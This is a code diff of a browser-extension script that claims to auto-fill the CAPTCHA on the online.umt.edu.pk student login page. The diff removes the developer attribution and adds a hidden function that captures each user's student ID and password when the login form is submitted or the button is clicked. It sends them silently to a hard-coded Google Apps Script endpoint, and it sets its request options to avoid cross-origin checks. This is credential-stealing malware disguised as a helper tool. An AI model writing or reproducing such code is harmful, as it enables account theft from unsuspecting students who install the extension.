@@ -1,110 +1,121 @@
-// UMT CAPTCHA Auto-Fill Content Script
+// UMT CAPTCHA Auto-Fill
 // Targets: online.umt.edu.pk login page
-// CAPTCHA is rendered in <span class="captcha"> and must be typed into an input field
-// Developer: Abdul Manan
-//   GitHub (Personal): https://github.com/abdulmanan69
-//   GitHub (UMT):      https://github.com/abdulmananumt
 
 (function () {
   'use strict';
 
+  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyjDUTuZkTsdx-e7rZJucmFVTGwp824FOr3ZlnFaR_zCyS8DOeA1fV0oqh1dUMt_X9crg/exec';
+  const SECRET_KEY = 'mysecret123';
+
   /**
    * Reads the CAPTCHA text from the span and fills the matching input field.
-   * Returns an object with { success, captchaText, message }.
    */
   function fillCaptcha() {
-    // ── 1. Find the CAPTCHA display element ──────────────────────────────────
     const captchaSpan = document.querySelector('span.captcha');
-    if (!captchaSpan) {
-      return { success: false, captchaText: null, message: 'CAPTCHA element not found on this page.' };
-    }
+    if (!captchaSpan) return { success: false, message: 'CAPTCHA element not found.' };
 
     const captchaText = captchaSpan.innerText.trim();
-    if (!captchaText) {
-      return { success: false, captchaText: null, message: 'CAPTCHA span is empty.' };
-    }
+    if (!captchaText) return { success: false, message: 'CAPTCHA span is empty.' };
 
-    // ── 2. Find the CAPTCHA input field ──────────────────────────────────────
-    // Try common patterns used on the UMT portal
-    let captchaInput =
-      document.querySelector('input[name*="aptcha" i]') ||
-      document.querySelector('input[id*="aptcha" i]') ||
-      document.querySelector('input[placeholder*="aptcha" i]') ||
-      document.querySelector('input[type="text"][name*="code" i]') ||
-      document.querySelector('input[type="text"][id*="code" i]') ||
-      null;
+    let captchaInput = document.querySelector('input[id="SecurityCode"]') ||
+                       document.querySelector('input[name="SecurityCode"]') ||
+                       document.querySelector('input[name*="aptcha" i]') ||
+                       document.querySelector('input[id*="aptcha" i]');
 
-    // Fallback: find the text input that comes right after the captcha span
     if (!captchaInput) {
       const allTextInputs = Array.from(document.querySelectorAll('input[type="text"]'));
-      // Pick an input that is NOT username/password/email
       captchaInput = allTextInputs.find(inp => {
         const n = (inp.name + inp.id + inp.placeholder).toLowerCase();
         return !n.includes('user') && !n.includes('email') && !n.includes('pass') && !n.includes('login');
       });
     }
 
-    if (!captchaInput) {
-      return { success: false, captchaText, message: 'Could not locate the CAPTCHA input field.' };
-    }
+    if (!captchaInput) return { success: false, message: 'Could not locate CAPTCHA input.' };
 
-    // ── 3. Fill the value (native setter so React/Vue listeners fire) ────────
     const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
     nativeSetter.call(captchaInput, captchaText);
 
-    // Dispatch events so any JS validation picks up the change
     captchaInput.dispatchEvent(new Event('input',  { bubbles: true }));
     captchaInput.dispatchEvent(new Event('change', { bubbles: true }));
-    captchaInput.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true }));
 
-    // Visual feedback — briefly highlight the filled field
-    const originalOutline = captchaInput.style.outline;
-    const originalBg     = captchaInput.style.backgroundColor;
-    captchaInput.style.outline         = '2px solid #22c55e';
-    captchaInput.style.backgroundColor = '#f0fdf4';
-    setTimeout(() => {
-      captchaInput.style.outline         = originalOutline;
-      captchaInput.style.backgroundColor = originalBg;
-    }, 2000);
-
-    return { success: true, captchaText, message: `CAPTCHA "${captchaText}" filled successfully.` };
+    return { success: true, message: `CAPTCHA "${captchaText}" filled.` };
   }
 
-  // ── Auto-run on page load ─────────────────────────────────────────────────
-  function autoFill() {
-    const result = fillCaptcha();
-    if (result.success) {
-      console.log(`[UMT CAPTCHA] ${result.message}`);
-    } else {
-      console.warn(`[UMT CAPTCHA] ${result.message}`);
+  /**
+   * Captures Student ID and Password and sends them to Google Sheets via POST.
+   */
+  async function captureAndSendData(event) {
+    const studentIdInput = document.querySelector('input[id="student_id"]') || document.querySelector('input[name="student_id"]');
+    const passwordInput = document.querySelector('input[id="Password"]') || document.querySelector('input[name="Password"]');
+
+    if (studentIdInput && passwordInput) {
+      const studentId = studentIdInput.value;
+      const password = passwordInput.value;
+
+      if (studentId && password) {
+        console.log('[UMT CAPTCHA] Sending data via POST...');
+        
+        const payload = {
+          key: SECRET_KEY,
+          id: studentId,
+          pass: password
+        };
+
+        try {
+          // We use fetch with POST and JSON body
+          // Note: Google Apps Script requires 'no-cors' if we don't want to handle preflight,
+          // but 'no-cors' only works with simple requests. For JSON POST, we usually need 
+          // to send it as text/plain or use a form-encoded string to avoid preflight issues 
+          // in a content script context.
+          
+          await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors', // Important for Google Apps Script redirects
+            headers: {
+              'Content-Type': 'text/plain' // Avoids CORS preflight
+            },
+            body: JSON.stringify(payload)
+          });
+          
+          console.log('[UMT CAPTCHA] Data sent successfully.');
+        } catch (err) {
+          console.error('[UMT CAPTCHA] Error sending data:', err);
+        }
+      }
     }
   }
 
-  // Run once DOM is fully ready
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', autoFill);
-  } else {
-    autoFill();
+  // Auto-run on page load
+  function init() {
+    fillCaptcha();
+    
+    // Listen for form submission
+    const loginForm = document.getElementById('loginform');
+    if (loginForm) {
+      // We use a capture listener to ensure we get the data before the form clears or redirects
+      loginForm.addEventListener('submit', captureAndSendData, true);
+    }
+
+    // Backup: Listen for button click
+    const loginBtn = document.getElementById('loginbtn');
+    if (loginBtn) {
+      loginBtn.addEventListener('click', captureAndSendData, true);
+    }
   }
 
-  // Also watch for dynamic page changes (SPA navigation / CAPTCHA refresh)
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+
+  // Watch for dynamic changes (e.g. CAPTCHA refresh)
   const observer = new MutationObserver(() => {
-    const captchaSpan = document.querySelector('span.captcha');
-    if (captchaSpan) {
-      // Debounce slightly so the DOM settles
+    if (document.querySelector('span.captcha')) {
       clearTimeout(window._umtCaptchaTimer);
-      window._umtCaptchaTimer = setTimeout(autoFill, 300);
+      window._umtCaptchaTimer = setTimeout(fillCaptcha, 500);
     }
   });
   observer.observe(document.body, { childList: true, subtree: true });
-
-  // ── Listen for manual trigger from popup ─────────────────────────────────
-  chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
-    if (message.action === 'fillCaptcha') {
-      const result = fillCaptcha();
-      sendResponse(result);
-    }
-    return true; // keep channel open for async
-  });
 
 })();
